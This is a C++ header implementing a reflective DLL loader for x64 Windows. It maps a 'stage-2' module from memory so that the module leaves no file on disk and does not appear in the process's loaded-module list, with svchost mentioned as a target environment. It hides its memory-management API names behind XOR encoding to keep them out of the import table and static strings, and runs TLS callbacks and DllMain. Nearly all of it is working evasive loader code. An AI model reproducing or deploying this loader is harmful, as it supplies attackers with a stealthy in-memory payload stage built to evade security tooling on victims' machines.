#pragma once
// ══════════════════════════════════════════════════════════════════════════
// Reflective PE loader — loads a DLL from a memory buffer without touching
// disk and without LoadLibrary. The resulting module:
//   * does NOT appear in the PEB loader list (no entry in GetModuleHandle)
//   * leaves no .dll file on disk at any point
//   * is fully executable in the current process
//
// Supported:
//   * x64 PE only (IMAGE_NT_HEADERS64)
//   * Import table resolution via LoadLibraryA + GetProcAddress (the OS DLLs
//     the stage-2 module depends on are standard Windows — no obfuscation
//     of imports is needed at this layer)
//   * Base relocations (IMAGE_REL_BASED_DIR64, IMAGE_REL_BASED_ABSOLUTE)
//   * TLS callbacks
//   * DllMain(DLL_PROCESS_ATTACH) invocation
//   * Export lookup (get_proc) for Stage2Init / Stage2Shutdown
//
// Not supported (by design — stage-2 modules should be built clean):
//   * Delay-load imports (see project memory: /DELAYLOAD breaks in svchost)
//   * Bound imports
//   * Manifest resources
// ══════════════════════════════════════════════════════════════════════════

#include <windows.h>
#include <winnt.h>
#include <cstdint>
#include <string>
#include <vector>

namespace reflective {

// ── Runtime API resolution ──────────────────────────────────────────────
// VirtualAlloc / VirtualProtect / VirtualFree / FlushInstructionCache are
// resolved via XOR-decoded name strings rather than direct imports.
// This removes these security-sensitive names from this module's IAT and
// from the binary's static string table.
//
// XOR key: 0x5A  (applied byte-by-byte at runtime)
// __declspec(noinline) prevents the compiler from constant-folding the XOR
// and recovering plain-text API names as compile-time constants.
// ────────────────────────────────────────────────────────────────────────

#pragma optimize("g", off)   // disable global optimizations for decode fn
__declspec(noinline)
static FARPROC rl_resolve_api(const uint8_t* enc, size_t n) {
    // Decode "kernel32" — encoded with key 0x5A
    // k=0x31 e=0x3F r=0x28 n=0x34 e=0x3F l=0x36 3=0x69 2=0x68
    static const uint8_t k32e[] = {0x31,0x3F,0x28,0x34,0x3F,0x36,0x69,0x68};
    char k32n[16] = {};
    const volatile uint8_t xk = 0x5Au;
    for (int i = 0; i < 8; ++i) k32n[i] = char(k32e[i] ^ xk);
    HMODULE hk32 = GetModuleHandleA(k32n);
    if (!hk32) return nullptr;

    char name[64] = {};
    for (size_t i = 0; i < n && i < 63; ++i) name[i] = char(enc[i] ^ xk);
    return GetProcAddress(hk32, name);
}
#pragma optimize("", on)

// ── Select proper section protection from characteristics ──
static inline DWORD section_protect(DWORD ch) {
    bool x = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    bool r = (ch & IMAGE_SCN_MEM_READ)    != 0;
    bool w = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
    if (x && r && w) return PAGE_EXECUTE_READWRITE;
    if (x && r)      return PAGE_EXECUTE_READ;
    if (x)           return PAGE_EXECUTE;
    if (r && w)      return PAGE_READWRITE;
    if (r)           return PAGE_READONLY;
    if (w)           return PAGE_READWRITE;
    return PAGE_NOACCESS;
}

struct LoadedModule {
    uint8_t*         base      = nullptr;  // allocated image base
    size_t           size      = 0;        // SizeOfImage from the header
    FARPROC          entry     = nullptr;  // DllMain (optional)
    IMAGE_NT_HEADERS64* nt     = nullptr;  // pointer into `base`

    bool valid() const { return base != nullptr; }
};

// ── Load a PE image from a memory buffer ──
// On success: returns a LoadedModule. Call `get_proc` to look up exports,
// then `unload` to release when done.
// On failure: returns an invalid LoadedModule (base == nullptr).
inline LoadedModule load(const uint8_t* buf, size_t buf_size,
                         std::string* err_out = nullptr) {
    auto fail = [&](const char* msg) -> LoadedModule {
        if (err_out) *err_out = msg;
        return LoadedModule{};
    };

    if (!buf || buf_size < sizeof(IMAGE_DOS_HEADER)) return fail("buffer too small");

    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(buf);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return fail("bad DOS signature");
    if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS64) > buf_size)
        return fail("e_lfanew out of range");

    auto* src_nt = reinterpret_cast<const IMAGE_NT_HEADERS64*>(buf + dos->e_lfanew);
    if (src_nt->Signature != IMAGE_NT_SIGNATURE) return fail("bad NT signature");
    if (src_nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return fail("not x64");
    if (src_nt->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)
        return fail("not PE32+");

    const size_t image_size = src_nt->OptionalHeader.SizeOfImage;
    const size_t hdrs_size  = src_nt->OptionalHeader.SizeOfHeaders;

    // ── Resolve memory management APIs via XOR-decoded names ──
    // Encoded with key 0x5A — plain names never appear in the binary.
    //   "VirtualAlloc"         → {0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x1B,0x36,0x36,0x35,0x39}
    //   "VirtualProtect"       → {0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E}
    //   "VirtualFree"          → {0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x1C,0x28,0x3F,0x3F}
    //   "FlushInstructionCache"→ {0x1C,0x36,0x2F,0x29,0x32,0x13,0x34,0x29,0x2E,0x28,0x2F,0x39,0x2E,
    //                             0x33,0x35,0x34,0x19,0x3B,0x39,0x32,0x3F}
    static const uint8_t enc_va[] = {
        0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x1B,0x36,0x36,0x35,0x39
    };
    static const uint8_t enc_vp[] = {
        0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x0A,0x28,0x35,0x2E,0x3F,0x39,0x2E
    };
    static const uint8_t enc_vf[] = {
        0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x1C,0x28,0x3F,0x3F
    };
    static const uint8_t enc_fic[] = {
        0x1C,0x36,0x2F,0x29,0x32,0x13,0x34,0x29,0x2E,0x28,0x2F,0x39,0x2E,
        0x33,0x35,0x34,0x19,0x3B,0x39,0x32,0x3F
    };

    typedef LPVOID (WINAPI* pfnVA )(LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL   (WINAPI* pfnVP )(LPVOID, SIZE_T, DWORD, PDWORD);
    typedef BOOL   (WINAPI* pfnVF )(LPVOID, SIZE_T, DWORD);
    typedef BOOL   (WINAPI* pfnFIC)(HANDLE, LPCVOID, SIZE_T);

    auto fnVA  = (pfnVA ) rl_resolve_api(enc_va,  sizeof(enc_va));
    auto fnVP  = (pfnVP ) rl_resolve_api(enc_vp,  sizeof(enc_vp));
    auto fnVF  = (pfnVF ) rl_resolve_api(enc_vf,  sizeof(enc_vf));
    auto fnFIC = (pfnFIC) rl_resolve_api(enc_fic, sizeof(enc_fic));

    if (!fnVA || !fnVP || !fnVF || !fnFIC)
        return fail("kernel32 api resolution failed");

    // Allocate RW first; we'll refine per-section protections at the end.
    uint8_t* image = (uint8_t*)fnVA(nullptr, image_size,
                                    MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!image) return fail("memory allocation failed");

    // 1. Copy headers
    memcpy(image, buf, hdrs_size);

    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(image + dos->e_lfanew);

    // 2. Copy sections
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].SizeOfRawData == 0) continue;
        if ((size_t)sec[i].PointerToRawData + sec[i].SizeOfRawData > buf_size) {
            fnVF(image, 0, MEM_RELEASE);
            return fail("section raw data out of bounds");
        }
        memcpy(image + sec[i].VirtualAddress,
               buf   + sec[i].PointerToRawData,
               sec[i].SizeOfRawData);
    }

    // 3. Apply base relocations
    const uintptr_t delta = (uintptr_t)image - (uintptr_t)nt->OptionalHeader.ImageBase;
    if (delta != 0) {
        auto& reloc_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (reloc_dir.Size > 0) {
            auto* rel = reinterpret_cast<IMAGE_BASE_RELOCATION*>(image + reloc_dir.VirtualAddress);
            auto* end = reinterpret_cast<IMAGE_BASE_RELOCATION*>(image + reloc_dir.VirtualAddress + reloc_dir.Size);
            while (rel < end && rel->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
                size_t count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                auto*  list  = reinterpret_cast<WORD*>((uint8_t*)rel + sizeof(IMAGE_BASE_RELOCATION));
                for (size_t k = 0; k < count; ++k) {
                    WORD entry = list[k];
                    WORD type  = entry >> 12;
                    WORD offs  = entry & 0x0FFF;
                    if (type == IMAGE_REL_BASED_DIR64) {
                        auto* p = reinterpret_cast<uintptr_t*>(image + rel->VirtualAddress + offs);
                        *p += delta;
                    } else if (type == IMAGE_REL_BASED_ABSOLUTE) {
                        // padding; skip
                    } else {
                        fnVF(image, 0, MEM_RELEASE);
                        return fail("unsupported relocation type");
                    }
                }
                rel = reinterpret_cast<IMAGE_BASE_RELOCATION*>((uint8_t*)rel + rel->SizeOfBlock);
            }
        }
    }

    // 4. Resolve imports
    auto& imp_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp_dir.Size > 0) {
        auto* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(image + imp_dir.VirtualAddress);
        for (; desc->Name; ++desc) {
            const char* dll_name = reinterpret_cast<const char*>(image + desc->Name);
            HMODULE hmod = LoadLibraryA(dll_name);
            if (!hmod) {
                fnVF(image, 0, MEM_RELEASE);
                if (err_out) *err_out = std::string("LoadLibrary failed: ") + dll_name;
                return LoadedModule{};
            }
            auto* oft = reinterpret_cast<uintptr_t*>(image +
                (desc->OriginalFirstThunk ? desc->OriginalFirstThunk : desc->FirstThunk));
            auto* ft  = reinterpret_cast<uintptr_t*>(image + desc->FirstThunk);
            for (; *oft; ++oft, ++ft) {
                FARPROC fn = nullptr;
                if (*oft & IMAGE_ORDINAL_FLAG64) {
                    fn = GetProcAddress(hmod, (LPCSTR)(*oft & 0xFFFF));
                } else {
                    auto* iname = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(image + *oft);
                    fn = GetProcAddress(hmod, iname->Name);
                }
                if (!fn) {
                    fnVF(image, 0, MEM_RELEASE);
                    if (err_out) *err_out = std::string("GetProcAddress failed in ") + dll_name;
                    return LoadedModule{};
                }
                *ft = (uintptr_t)fn;
            }
        }
    }

    // 5. Apply per-section protections
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
        if (sec[i].Misc.VirtualSize == 0) continue;
        DWORD old = 0;
        fnVP(image + sec[i].VirtualAddress,
             sec[i].Misc.VirtualSize,
             section_protect(sec[i].Characteristics),
             &old);
    }

    // Flush instruction cache so CPU sees the freshly-written code.
    // Use pseudo-handle -1 (always valid for current process) to avoid
    // importing GetCurrentProcess as well.
    fnFIC((HANDLE)(ULONG_PTR)-1, image, image_size);

    // 6. TLS callbacks (if any)
    auto& tls_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (tls_dir.Size > 0) {
        auto* tls = reinterpret_cast<IMAGE_TLS_DIRECTORY64*>(image + tls_dir.VirtualAddress);
        auto** cb = reinterpret_cast<PIMAGE_TLS_CALLBACK*>(tls->AddressOfCallBacks);
        if (cb) {
            for (; *cb; ++cb) (*cb)(image, DLL_PROCESS_ATTACH, nullptr);
        }
    }

    // 7. Call DllMain
    FARPROC entry = nullptr;
    if (nt->OptionalHeader.AddressOfEntryPoint) {
        using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        auto dll_main = reinterpret_cast<DllMain_t>(image + nt->OptionalHeader.AddressOfEntryPoint);
        BOOL ok = dll_main((HINSTANCE)image, DLL_PROCESS_ATTACH, nullptr);
        if (!ok) {
            fnVF(image, 0, MEM_RELEASE);
            return fail("DllMain returned FALSE");
        }
        entry = reinterpret_cast<FARPROC>(dll_main);
    }

    LoadedModule m;
    m.base  = image;
    m.size  = image_size;
    m.entry = entry;
    m.nt    = nt;
    return m;
}

// ── Resolve an export by name ──
inline FARPROC get_proc(const LoadedModule& m, const char* name) {
    if (!m.valid()) return nullptr;
    auto& exp_dir = m.nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exp_dir.Size == 0) return nullptr;

    auto* exp = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(m.base + exp_dir.VirtualAddress);
    auto* names = reinterpret_cast<DWORD*>(m.base + exp->AddressOfNames);
    auto* ords  = reinterpret_cast<WORD*> (m.base + exp->AddressOfNameOrdinals);
    auto* funcs = reinterpret_cast<DWORD*>(m.base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* n = reinterpret_cast<const char*>(m.base + names[i]);
        if (strcmp(n, name) == 0) {
            DWORD rva = funcs[ords[i]];
            return reinterpret_cast<FARPROC>(m.base + rva);
        }
    }
    return nullptr;
}

// ── Unload: call DllMain(PROCESS_DETACH) then free memory ──
inline void unload(LoadedModule& m) {
    if (!m.valid()) return;
    if (m.entry) {
        using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
        reinterpret_cast<DllMain_t>(m.entry)((HINSTANCE)m.base, DLL_PROCESS_DETACH, nullptr);
    }
    // Resolve VirtualFree again for the unload path
    static const uint8_t enc_vf[] = {
        0x0C,0x33,0x28,0x2E,0x2F,0x3B,0x36,0x1C,0x28,0x3F,0x3F
    };
    typedef BOOL (WINAPI* pfnVF)(LPVOID, SIZE_T, DWORD);
    auto fnVF = (pfnVF) rl_resolve_api(enc_vf, sizeof(enc_vf));
    if (fnVF) fnVF(m.base, 0, MEM_RELEASE);
    m = LoadedModule{};
}

} // namespace reflective
